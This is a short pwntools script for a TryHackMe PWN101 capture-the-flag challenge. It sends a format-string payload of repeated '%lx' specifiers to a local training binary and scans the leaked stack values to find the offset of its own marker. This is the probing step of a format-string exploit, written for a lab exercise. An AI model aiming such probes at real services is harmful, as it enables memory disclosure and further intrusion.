#!/usr/bin/python3

# TryHackMe - Room PWN101 - Challenge 8 - Address Fuzzer

from pwn import *
#context.log_level = 'debug'

host = "10.10.10.10"
port = 9007

executable = './108'

#io = remote(host, port)
io = process(executable)

io.sendlineafter(b"=[Your name]: ", b"AAAA")

real_payload = ("ABABABAB.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx").encode()
io.sendlineafter(b"=[Your Reg No]: ", real_payload)
io.recvuntil(b'Register no  : ')

# Leaked memory positions
leaked = io.recvline().decode().strip().split('.')
for i in range(len(leaked)-1):
    if str(leaked[i+1]) == "4241424142414241":
        info("Index: " + str(i+1) + " - Address: " + str(leaked[i+1]))

io.close()
